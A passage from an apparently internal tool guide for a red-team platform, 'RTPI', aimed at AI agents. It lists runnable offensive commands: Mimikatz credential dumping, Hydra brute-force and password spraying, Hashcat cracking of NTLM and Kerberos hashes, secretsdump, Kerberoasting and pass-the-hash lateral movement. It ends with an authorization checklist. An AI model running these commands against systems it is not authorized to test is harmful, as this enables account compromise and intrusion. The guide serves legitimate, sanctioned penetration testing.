2. **Multiple collection runs**: Session data changes frequently
3. **Mark owned principals**: Right-click users → "Mark User as Owned"
4. **Focus on shortest paths**: Easiest attack vectors
5. **Export queries**: Save custom queries for reuse

---

### PowerSploit & WinPwn
**Purpose**: PowerShell post-exploitation frameworks
**Location**: `/opt/tools/PowerSploit` and `/opt/tools/WinPwn`

#### PowerSploit Modules

**PowerView** - AD Enumeration:
```powershell
# Import
Import-Module /opt/tools/PowerSploit/Recon/PowerView.ps1

# Get domain info
Get-Domain
Get-DomainController

# Find users
Get-DomainUser
Get-DomainUser -Identity username

# Find groups
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"

# Find computers
Get-DomainComputer

# Find local admin access
Find-LocalAdminAccess

# Find sessions
Get-NetSession -ComputerName dc01
```

**PowerUp** - Privilege Escalation:
```powershell
Import-Module /opt/tools/PowerSploit/Privesc/PowerUp.ps1

# Check all privesc vectors
Invoke-AllChecks

# Service abuse
Get-ServiceUnquoted
Get-ModifiableServiceFile
```

**Invoke-Mimikatz**:
```powershell
# Extract credentials from memory
Invoke-Mimikatz -DumpCreds
```

---

## Credential Attacks

### Hydra
**Purpose**: Online password brute forcing
**Installation**: APT package
**Command**: `hydra`

#### 7 Essential Hydra Commands

**1. SSH Brute Force (Slow & Safe)**:
```bash
# Single user, password list
hydra -l username -P passwords.txt ssh://target -t 4 -V

# Multiple users and passwords (safer with -t 4)
hydra -L users.txt -P passwords.txt ssh://target:22 -t 4 -f -o ssh-creds.txt

# With known password pattern testing
hydra -l admin -P passwords.txt ssh://target -e nsr -t 4

# -e nsr = try n(ull), s(ame as username), r(eversed username)
```

**2. FTP Brute Force**:
```bash
# Standard FTP attack
hydra -L users.txt -P passwords.txt ftp://target -t 10 -V

# Anonymous FTP check
hydra -l anonymous -p anonymous ftp://target

# With custom port
hydra -L users.txt -P passwords.txt ftp://target:2121 -t 10
```

**3. HTTP Basic Authentication**:
```bash
# Basic auth brute force
hydra -l admin -P passwords.txt http-get://target/admin -t 10 -V

# With custom user agent
hydra -l admin -P passwords.txt http-get://target/admin -m "User-Agent: Mozilla/5.0"
```

**4. HTTP POST Form Login**:
```bash
# Web form brute force (most common)
# Syntax: "page:form-params:failure-string"
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid username or password" \
  -t 10 -V

# With session cookie
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^&submit=Login:F=incorrect" \
  -H "Cookie: PHPSESSID=abc123" \
  -t 10

# Success string instead of failure (use S= instead of F=)
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:S=Welcome" \
  -t 10
```

**5. SMB/Windows Share Brute Force**:
```bash
# SMB password spray
hydra -L users.txt -p Password123 smb://target -t 5 -V

# SMB brute force (slower for lockout prevention)
hydra -l administrator -P passwords.txt smb://target -t 1 -w 3

# -w 3 = wait 3 seconds between attempts (avoid lockout)
```

**6. RDP Brute Force (Careful - Lockouts!)**:
```bash
# RDP brute force (VERY SLOW to avoid lockouts)
hydra -l administrator -P top-10-passwords.txt rdp://target -t 1 -w 5

# Domain RDP
hydra -l 'DOMAIN\administrator' -P passwords.txt rdp://target -t 1

# Multiple users, single password (password spray)
hydra -L domain-users.txt -p Spring2024! rdp://target -t 1 -w 10
```

**7. MySQL/PostgreSQL Database Brute Force**:
```bash
# MySQL brute force
hydra -l root -P passwords.txt mysql://target:3306 -t 4

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://target:5432 -t 4

# With specific database
hydra -l admin -P passwords.txt mysql://target/dbname -t 4
```

**Bonus - Password Spray Attack**:
```bash
# Spray one password across many users (safer than brute force)
hydra -L domain-users.txt -p Winter2024! smb://target -t 1 -w 10 -V -o spray-results.txt

# Spray multiple common passwords (with delays)
hydra -L users.txt -p Password123 -p Welcome1 -p Spring2024! ssh://target -t 4 -w 5
```

#### Best Practices
1. **Rate limiting**: Use `-t` to avoid lockouts (typically `-t 4` for SSH)
2. **Account lockout awareness**: Respect target security policies
3. **Targeted lists**: Use intelligence-based wordlists, not generic large lists
4. **Authorization**: Only on systems you're authorized to test

---

### Hashcat
**Purpose**: Offline password hash cracking
**Installation**: APT package
**Command**: `hashcat`

#### Common Hash Types Reference
```bash
-m 0     # MD5
-m 100   # SHA1
-m 1000  # NTLM (Windows)
-m 3000  # LM (legacy Windows)
-m 1800  # SHA-512(Unix)
-m 5600  # NetNTLMv2
-m 13100 # Kerberos TGS-REP (Kerberoasting)
-m 18200 # Kerberos AS-REP (AS-REP Roasting)
-m 22000 # WPA-PBKDF2-PMKID+EAPOL (WiFi)
```

#### 7 Essential Hashcat Commands

**1. NTLM Hash Cracking (Windows)**:
```bash
# Basic wordlist attack
hashcat -m 1000 ntlm-hashes.txt rockyou.txt -O

# With rules (dramatically improves success rate)
hashcat -m 1000 ntlm-hashes.txt rockyou.txt -r best64.rule -O

# Show cracked passwords
hashcat -m 1000 ntlm-hashes.txt --show

# High performance mode
hashcat -m 1000 ntlm-hashes.txt rockyou.txt -O -w 3
```

**2. Kerberoasting Ticket Cracking**:
```bash
# Crack TGS tickets from GetUserSPNs.py (hashcat format)
hashcat -m 13100 kerberoast-tickets.txt rockyou.txt -r best64.rule -O

# With multiple wordlists
hashcat -m 13100 kerberoast-tickets.txt wordlist1.txt wordlist2.txt -r best64.rule

# Resume session if interrupted
hashcat -m 13100 kerberoast-tickets.txt rockyou.txt --session kerb --restore
```

**3. AS-REP Roasting Hash Cracking**:
```bash
# Crack AS-REP hashes from GetNPUsers.py
hashcat -m 18200 asrep-hashes.txt rockyou.txt -r best64.rule -O

# Aggressive attack
hashcat -m 18200 asrep-hashes.txt rockyou.txt -r best64.rule -O -w 4
```

**4. Mask Attack (Brute Force) - Known Password Pattern**:
```bash
# Corporate password format: Welcome2024!
hashcat -m 1000 hashes.txt -a 3 Welcome?d?d?d?d! -O

# 8-character complexity: Aa1! format
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?l?d?s -O

# Mask placeholders:
# ?l = lowercase (a-z)
# ?u = uppercase (A-Z)
# ?d = digit (0-9)
# ?s = special (!@#$%...)
# ?a = all characters

# Custom charset
hashcat -m 1000 hashes.txt -a 3 -1 ?l?u ?1?1?1?1?1?1?d?d -O
# -1 defines custom charset (lowercase + uppercase)
```

**5. Hybrid Attack (Wordlist + Mask)**:
```bash
# Wordlist + year (Password2024, Welcome2024, etc.)
hashcat -m 1000 hashes.txt -a 6 rockyou.txt ?d?d?d?d -O

# Wordlist + special char (Password!, Welcome#, etc.)
hashcat -m 1000 hashes.txt -a 6 rockyou.txt ?s -O

# Mask + wordlist (2024Password, 2024Welcome, etc.)
hashcat -m 1000 hashes.txt -a 7 ?d?d?d?d rockyou.txt -O
```

**6. Combination Attack (Join Two Words)**:
```bash
# Combine two wordlists (Summer + Time = SummerTime)
hashcat -m 1000 hashes.txt -a 1 wordlist1.txt wordlist2.txt -O

# Combine with numbers
hashcat -m 1000 hashes.txt -a 1 words.txt numbers.txt -O
```

**7. NetNTLMv2 Cracking (Responder Hashes)**:
```bash
# Crack NetNTLMv2 hashes from Responder or ntlmrelayx
hashcat -m 5600 netntlmv2-hashes.txt rockyou.txt -r best64.rule -O

# With multiple rules
hashcat -m 5600 netntlmv2-hashes.txt rockyou.txt -r best64.rule -r dive.rule -O
```

**Bonus - Performance Optimization & Session Management**:
```bash
# Check status during cracking (press 's' in terminal)
# Bypass warnings
hashcat -m 1000 hashes.txt rockyou.txt --force

# Named session for easy resume
hashcat -m 1000 hashes.txt rockyou.txt --session mysession -O

# Restore previous session
hashcat --session mysession --restore

# Show benchmark for your hardware
hashcat -b

# Workload profiles:
# -w 1 = Low (desktop usage)
# -w 2 = Default (balanced)
# -w 3 = High (dedicated)
# -w 4 = Nightmare (may hang system)

# Output cracked hashes to file
hashcat -m 1000 hashes.txt rockyou.txt -O -o cracked.txt

# Show progress stats
hashcat -m 1000 hashes.txt rockyou.txt --status --status-timer=10
```

#### Best Practices
1. **Start with wordlists**: Brute force is last resort
2. **Use rules**: `best64.rule`, `dive.rule` dramatically improve success
3. **Status checking**: Press 's' during run for status
4. **Save outputs**: Use `--show` to display cracked hashes
5. **Hardware**: GPU acceleration crucial for performance

---

## Post-Exploitation

### SearchSploit
**Purpose**: Offline exploit database search
**Installation**: Git clone of exploit-db
**Command**: `searchsploit`

```bash
# Search by keyword
searchsploit apache 2.4

# Search by CVE
searchsploit CVE-2021-44228

# Exact title match
searchsploit -t apache 2.4.49

# Case insensitive
searchsploit -i apache

# Show exploit path
searchsploit -p 12345

# Copy exploit to current directory
searchsploit -m 12345

# Update database
searchsploit -u
```

---

### Python Tools (Pwntools, Cryptography)
**Purpose**: Exploit development and crypto operations
**Installation**: Python packages

#### Pwntools Examples
```python
from pwn import *

# Connect to service
conn = remote('target', 1337)

# Send/receive data
conn.sendline(b'payload')
data = conn.recv()

# Pack integers
payload = p64(0x400000)  # 64-bit little-endian

# Create ROP chain
rop = ROP(elf)
rop.call('system', ['/bin/sh'])
```

#### Cryptography Examples
```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# AES encryption
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
encryptor = cipher.encryptor()
ct = encryptor.update(plaintext) + encryptor.finalize()
```

---

## Operational Workflows

### Complete Penetration Test Workflow

#### Phase 1: Reconnaissance
```bash
# 1. Subdomain enumeration
bbot -t target.com -f subdomain-enum -y --json -o bbot-results/

# 2. Host discovery
nmap -sn -iL subdomains.txt -oA host-discovery

# 3. Port scanning
nmap -T4 -p- -iL live-hosts.txt -oA full-port-scan

# 4. Service detection
nmap -sV -sC -p <ports> -iL live-hosts.txt -oA service-scan
```

#### Phase 2: Vulnerability Assessment
```bash
# 1. Technology fingerprinting
bbot -t target.com -m httpx,wappalyzer,sslcert -y

# 2. Vulnerability scanning (targeted)
nuclei -l targets.txt \
  -t nuclei-templates/http/cves/2024/ \
  -severity critical,high \
  -jsonl -o nuclei-results.json

# 3. Web app testing
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/big.txt -x php,html,txt

# 4. Nmap vulnerability scripts
nmap --script vuln -p <ports> target.com -oA vuln-scan
```

#### Phase 3: Exploitation
```bash
# 1. Search for exploits
searchsploit service-name version

# 2. Metasploit
msfconsole -q
use exploit/path/to/exploit
set RHOSTS target
exploit

# 3. Manual exploitation
# (depends on vulnerability)
```

#### Phase 4: Post-Exploitation (Windows/AD)
```bash
# 1. Credential extraction
secretsdump.py 'DOMAIN/user:pass@target'

# 2. AD enumeration
bloodhound-python -c All -u user -p pass -d domain.com -dc dc.domain.com

# 3. Privilege escalation
GetUserSPNs.py DOMAIN/user:pass -request -outputfile tickets.txt

# 4. Lateral movement
psexec.py -hashes :hash DOMAIN/Administrator@next-target
```

---

### RTPI-Specific Integration Patterns

#### Docker Execution via API
All tools in this container are executed through the Docker executor service:

```typescript
// Example: Execute BBOT scan
await dockerExecutor.exec(
  'rtpi-tools',
  ['bbot', '-t', 'example.com', '-y', '--json'],
  { timeout: 1800000 } // 30 minutes
);
```

#### Tool-Specific Executors
- **bbot-executor.ts**: Parses BBOT JSON events, stores in `discoveredAssets`/`discoveredServices`
- **nuclei-executor.ts**: Parses JSONL output, stores in `vulnerabilities` table
- **docker-executor.ts**: Multiplexes Docker stdout/stderr streams

#### Database Storage
Results are automatically stored in PostgreSQL:
- `discoveredAssets`: Domains, IPs, URLs from BBOT
- `discoveredServices`: Open ports and services from BBOT/Nmap
- `vulnerabilities`: Findings from Nuclei with CVSS scores
- `axScanResults`: Full scan metadata and raw results

---

## Safety & Authorization Requirements

### Critical Requirements for AI Agents

#### Authorization Checks
Before executing ANY security tool:
1. ✅ Verify explicit written authorization from asset owner
2. ✅ Confirm scope includes target domains/IPs
3. ✅ Check for time-based restrictions (testing windows)
4. ✅ Validate exclusions list (out-of-scope assets)

#### Prohibited Actions
🚫 **NEVER** execute tools without authorization
🚫 **NEVER** target production systems during business hours (unless authorized)
🚫 **NEVER** perform denial-of-service attacks
🚫 **NEVER** exfiltrate sensitive data beyond proof-of-concept
🚫 **NEVER** persist backdoors without explicit permission
🚫 **NEVER** crack passwords beyond authorized scope

#### Safe Practices
✅ Use `-t 1-4` for Hydra to avoid lockouts
✅ Start with `check` before `exploit` in Metasploit
✅ Rate limit all scans appropriately
✅ Document all actions for reporting
✅ Clean up artifacts after testing
✅ Stop immediately if instructed by asset owner

#### Rate Limiting Defaults
- **BBOT**: Auto-rate-limited by module
- **Nuclei**: `-rate-limit 50` (50 req/sec)
- **Nmap**: `-T3` or `-T4` timing templates
- **Gobuster**: `-t 10-20` threads
- **Hydra**: `-t 4` for SSH, `-t 10` for HTTP

#### Logging & Accountability
All tool executions through RTPI are:
- Logged with timestamps and user IDs
- Associated with specific operations
- Stored in `axScanResults` table
- Traceable to authorization documentation

---

## Tool Version Information

**Last Updated**: January 2026

| Tool | Version | Update Command |
|------|---------|----------------|
| BBOT | 2.7.2 | `pip3 install --upgrade bbot` |
| Nuclei | 3.6.2 | `nuclei -update` |
| Metasploit | 6.x | `msfupdate` |
| Nmap | 7.x | `sudo apt update && sudo apt upgrade nmap` |
| Gobuster | Latest | Rebuild container |

**Template Updates**:
```bash
# Nuclei templates (run periodically)
nuclei -update-templates
```

---

## Troubleshooting

### Common Issues

**BBOT Missing Dependencies**:
```bash
# Error: "ModuleNotFoundError: No module named 'asyncpg'"
# Fix: Already resolved in Dockerfile.tools with asyncpg installation
```

**Nuclei Template Paths**:
```bash
# Templates must be prefixed with full path
# Wrong: -t cves/
# Correct: -t nuclei-templates/http/cves/
# OR: Let RTPI auto-resolve via nuclei-executor.ts
```

**Nuclei Timeouts**:
```bash
# Large template sets (CVEs, vulnerabilities) can take 30-60+ minutes
# Ensure Docker execution timeout ≥ 2 hours (7200000ms)
```

**Metasploit Database**:
```bash
# Initialize database
msfdb init

# Check status
msfdb status
```

**Permission Issues**:
```bash
# Run as rtpi-tools user (non-root)
# If sudo needed: User already has NOPASSWD sudo
```

---

## Additional Resources

**Official Documentation**:
- BBOT: https://www.blacklanternsecurity.com/bbot/
- Nuclei: https://docs.projectdiscovery.io/tools/nuclei/
- Metasploit: https://docs.rapid7.com/metasploit/
- Nmap: https://nmap.org/book/
- Impacket: https://github.com/fortra/impacket
- BloodHound: https://bloodhound.readthedocs.io/

**Wordlists** (not included, must be added):
- SecLists: https://github.com/danielmiessler/SecLists
- RockYou: Common password list
- Custom wordlists based on target intelligence

---

## Conclusion

This guide provides comprehensive execution context for AI agents operating RTPI security tools. Always prioritize:

1. **Authorization**: Explicit permission required
2. **Safety**: Rate limiting and controlled testing
3. **Documentation**: Log all actions and findings
4. **Cleanup**: Remove artifacts after testing
5. **Communication**: Report findings responsibly

For questions or issues, refer to the RTPI documentation in `/home/cmndcntrl/code/rtpi/docs/` or submit issues to the project repository.

---

**Document Version**: 1.0
**Last Updated**: January 16, 2026
**Maintainer**: RTPI Development Team
